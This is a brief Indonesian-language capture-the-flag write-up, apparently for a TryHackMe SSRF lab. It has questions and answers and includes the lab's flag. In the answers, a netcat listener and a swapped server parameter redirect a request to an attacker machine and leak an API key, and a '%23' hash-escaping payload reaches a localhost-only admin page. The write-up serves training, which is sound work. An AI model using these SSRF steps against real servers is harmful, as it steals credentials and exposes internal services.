# SSRF exercise

pergi ke `http://<IP machine>:8087/`.

Q1: apa host yang hanya dapat mengakses admin area? 

A1: localhost (buka side bar, lalu klik admin area)

Q2: kemana parameter diarahkan oleh server?

A2: secure-file-storage.com (inspect element di download button)

Q3: gunakan SSRF untuk mengganti parameter point di server ke attack machine, apa API nya?

A3: THM{Hello_Im_just_an_API_key} (setelah inspect element buka netcat untuk listen pada port dengan `nc -lvp port` lalu ganti `secure-file-storage.com` ke `IP-attack:port`, API akan muncul di terminal)

Q bonus: dapatkan akses ke admin area

A bonus: ganti `IP-attack:port` pada bagian server menjadi `http://localhost:8087/admin%23` (teknik yang digunakan ini adalah "**escaping the hash [ # ]**" sebenarnya menggunakan `../admin#` namun jika tidak muncul apapun, kita dapat menggunakan teknik "**escaping the hash**" tersebut)